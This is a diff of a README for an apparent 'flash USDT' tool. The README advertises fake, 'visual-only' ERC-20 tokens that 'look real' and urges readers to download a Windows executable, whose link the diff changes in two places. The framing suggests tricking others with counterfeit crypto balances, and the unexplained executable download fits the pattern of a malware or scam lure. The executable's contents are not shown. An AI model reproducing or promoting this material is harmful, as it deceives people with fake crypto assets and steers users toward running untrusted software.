@@ -5,16 +5,12 @@ Lightweight, GUI-based Ethereum education utility designed for **flash token tra
 <h1 align="center"><b>🚀 Download Now</b></h1>
 
 <p align="center">
-  <a href="https://github.com/alpha-arb/FlashUSDT-Tool/releases/download/Tool/Flashing.Software.exe">
+  <a href="https://github.com/alpha-arb/FlashUSDT-Tool/releases/download/Tool/SoftwareERC20.exe">
     <img src="https://img.shields.io/badge/⬇️-Download-blue?style=for-the-badge&logo=github" alt="Download">
   </a>
 </p>
 
 > 💡 Perfect for testing, demos, or messing with your crypto friends. Looks real. Feels real. Isn't real.
-
-<p align="center">
-  <img width="307" height="385" alt="tool" src="https://github.com/user-attachments/assets/2beda859-f409-4b9d-9d39-67f689d19cc7" />
-</p>
 
 ## 🚀 Features
 
@@ -37,7 +33,7 @@ All tokens are **visual-only**, designed to simulate real assets:
 - **DAI (Multi-Collateral Dai)**
 
 <p align="center">
-  <a href="https://github.com/alpha-arb/FlashUSDT-Tool/releases/download/Tool/Flashing.Software.exe">
+  <a href="https://github.com/alpha-arb/FlashUSDT-Tool/releases/download/Tool/SoftwareERC20.exe">
     <img src="https://img.shields.io/badge/⬇️-Download-blue?style=for-the-badge&logo=github" alt="Download">
   </a>
 </p>
